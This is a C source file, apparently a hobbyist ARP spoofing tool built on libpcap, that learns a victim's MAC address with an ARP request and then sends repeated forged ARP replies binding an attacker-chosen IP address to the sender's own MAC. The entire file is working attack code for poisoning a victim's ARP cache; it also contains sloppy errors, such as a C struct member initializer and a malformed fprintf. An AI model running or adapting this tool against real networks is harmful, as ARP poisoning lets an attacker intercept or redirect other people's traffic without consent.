#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>

#define OP_REQUEST 0x0001
#define OP_REPLY 0x0002

unsigned char* requestpacket(char *s_ip, char *d_ip,char *mymac);
//unsigned char* replypacket(char *s_ip, char *d_ip,char *mymac, char *targetmac);
void mac_eth0(unsigned char MAC_str[13], char* dev);
void inputMacAddr(unsigned char* packet, char* addr);
int own_IP_Parsing(const unsigned char * own_IP);
//void inputMacAddr(unsigned char* packet, char* addr);


struct etherheader{  
  unsigned char dstmac[6];
  unsigned char srcmac[6];
  uint16_t type=htons(0x0806);
};
struct arpheader{
  uint16_t hardtype;
  uint16_t protocol;
  uint8_t hardsize;
  uint8_t prosize;
  uint16_t opcode;
  unsigned char srcmac[6];
  unsigned char srcip[4];
  unsigned char dstmac[6];
  unsigned char dstip[4];
};
struct sendingpacket{
  unsigned char *eth_dstmac[6];     
  unsigned char eth_srcmac[6];  
  uint16_t type;
  uint16_t hardtype;
  uint16_t protocol;
  uint8_t hardsize;
  uint8_t prosize;
  uint16_t opcode;
  unsigned char arp_srcmac[6];
  unsigned char arp_srcip[4];
  unsigned char arp_dstmac[6];
  unsigned char arp_dstip[4];

};

typedef struct fullarp {
    struct etherheader eth_hdr;
    struct arpheader arp_hdr;
} fullarphdr;


int main(int argc, char *argv[])
{
    pcap_t *handle;         /* Session handle */
    char *dev;          /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    char s_ip[16],d_ip[16];
    unsigned char own_IP[4];

    if (argc !=3){
        puts("usage : we need attacker[0] victime[1]");
        return 0;
    }
    dev="ens33";

    static char mymac[20];
    mac_eth0((unsigned char*)mymac,dev);
    
    
    strcpy(s_ip, argv[1]);
    strcpy(d_ip, argv[2]);
    

    printf("fake ip :%s\n", s_ip);
    printf("target ip %s\n", d_ip);

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    unsigned char* packet = (unsigned char*)malloc(60*sizeof(unsigned char));
    unsigned char* packet2 = (unsigned char*)malloc(60*sizeof(unsigned char));
    packet = requestpacket(s_ip, d_ip, mymac);
    struct pcap_pkthdr *header; /* The header that pcap gives us */
    const u_char *rpacket;      /* The actual packet */
    int retValue;
    u_char targetip[4];
    long ipaddr =inet_addr(d_ip);
    memcpy(targetip,&ipaddr,4);
while(1)
{
    if(pcap_sendpacket(handle,packet,60)!=0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
        return -1;
    }
    //////////////////////////////////////////////////////////////////////
    
    
    

    //u_char targetip[4] = {dst_ip32],packet[33],packet[34],packet[35]};
    //printf("target ip is : %x %x %x %x", targetip[1],targetip[2],targetip[3],targetip[4]);
    

    
    /* Grab a packet */
    retValue = pcap_next_ex(handle, &header, &rpacket);
    if( retValue <= 0 ){
        printf("Error grabbing packet");
        return -1;
    }
    if(rpacket[21]==1)
    {
        printf("opcode: request\n");
    }
    else if(rpacket[21]==2&&(targetip[0]==rpacket[28]&&targetip[1]==rpacket[29]&&targetip[2]==rpacket[30]&&targetip[3]==rpacket[31]))
    {   
        printf("targetmac ");
        for(int i=0; i<6; i++)
        {
            printf("%x", rpacket[6+i]);
        }

        printf("\nopcode : reply\n");
        
        
    printf("\n");
        break;
    }  
    else
    {
        printf("no arp\n");
    }

}
    /////////////////////////////reply//////////////////////////////

    unsigned char* arppacket = (unsigned char *)malloc(60*sizeof(unsigned char));
    struct etherheader *reethh;
    struct arpheader *rearph;

    reethh = (struct etherheader*)arppacket;
    memset(arppacket,0x00,60);
    memcpy(arppacket,rpacket+6 ,6);
    inputMacAddr(arppacket+6,mymac);
    reethh->type=htons(0x0806);

    rearph=(struct arpheader*)(arppacket+14);

    //arpsetting
    rearph->hardtype = htons(0x0001);
    rearph->protocol = htons(0x0800);
    rearph->hardsize = 6;
    rearph->prosize = 4;
    rearph->opcode = ntohs(OP_REPLY);
    //srcmac

    //srcmac = mymac
    inputMacAddr(arppacket+22,mymac);

    //srcip
    long addr2 = inet_addr(s_ip);
    memcpy(arppacket+14+14,&addr2,4); 
   
    //dst mac
    memcpy(arppacket+32,rpacket+6,6);

    //dst ip
    addr2 =inet_addr(d_ip);
    memcpy(arppacket+38,&addr2,4);

    for(int z=0; z<42; z++)
    {
        printf("%x", arppacket[z]);
    }
    printf("\n");
    int count =5;
    while(count--)
    {

    if(pcap_sendpacket(handle,arppacket,60)!=0)
    {

        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
        return -1;
    }
    //fflush("reply success %d..", count);
    sleep(2);

    }  
    pcap_close(handle);
    return 0;



}

unsigned char* requestpacket(char* s_ip, char* d_ip, char* mymac)
{
    
    unsigned char* packet = (unsigned char *)malloc(60*sizeof(unsigned char));
    struct ifreq ifr;
    
    struct etherheader *ethh;
    struct arpheader *arph;
    memset(packet,0x00,60);
    ethh = (struct etherheader*)packet;
    inputMacAddr(packet,"FFFFFFFFFFFF");
  
    printf("mymac : %s", mymac);
  
    inputMacAddr(packet+6,mymac);
    printf("\n");
    ethh->type=htons(0x0806);
    arph=(struct arpheader*)(packet+14); //expand
    arph->hardtype = htons(0x0001);
    arph->protocol = htons(0x0800);
    arph->hardsize = 6;
    arph->prosize = 4;
    arph->opcode = ntohs(OP_REQUEST);

    inputMacAddr(packet+ETH_HLEN+8,mymac);
    long ipaddr =inet_addr(s_ip);
    memcpy(packet+ETH_HLEN+14,&ipaddr,4);
    //Destination part
    inputMacAddr(packet+ETH_HLEN+18,"000000000000");
    ipaddr=inet_addr(d_ip);
    memcpy(packet+ETH_HLEN+24,&ipaddr,4);

    return packet;
}

   

void mac_eth0(unsigned char MAC_str[13], char* dev) //mac addressess
{
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<ETH_ALEN; i++)
        sprintf((char *)&MAC_str[i*2],"%02X",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    //

    MAC_str[12]='\0';
}

void inputMacAddr(unsigned char* packet, char* addr)
{
    char *endptr;
    char temp[10]={0,};
    for (int j=0; j<6; j++)
    {
        memcpy(temp,addr+j*2,2);
        temp[2] =0;
        packet[j] = (unsigned char)strtol(temp, &endptr, 16);
    }
}

